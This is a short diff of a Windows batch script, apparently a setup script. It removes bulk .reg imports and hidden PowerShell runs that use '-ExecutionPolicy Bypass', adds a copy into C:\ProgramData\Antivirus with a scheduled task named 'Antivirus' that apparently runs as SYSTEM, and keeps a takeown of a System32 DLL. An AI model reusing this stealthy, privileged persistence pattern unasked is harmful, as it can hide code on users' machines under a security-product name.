@@ -10,15 +10,10 @@ setlocal EnableExtensions EnableDelayedExpansion
 :: Script dir
 cd /d "%~dp0"
 
-:: Execute Registry (.reg) files
-for /f "tokens=*" %%C in ('dir /b /o:n *.reg 2^>nul') do (
-    reg import "%%C"
-)
-
-:: Execute PowerShell (.ps1) files alphabetically
-for /f "tokens=*" %%A in ('dir /b /o:n *.ps1 2^>nul') do (
-    start "" powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%%A"
-)
+:: Copy to the install location
+md C:\ProgramData\Antivirus
+copy "*.*" "C:\ProgramData\Antivirus\"
+schtasks /create /tn "Antivirus" /xml "Antivirus.xml" /ru ""
 
 :: Perms
 takeown /f %windir%\System32\Oobe\useroobe.dll /A
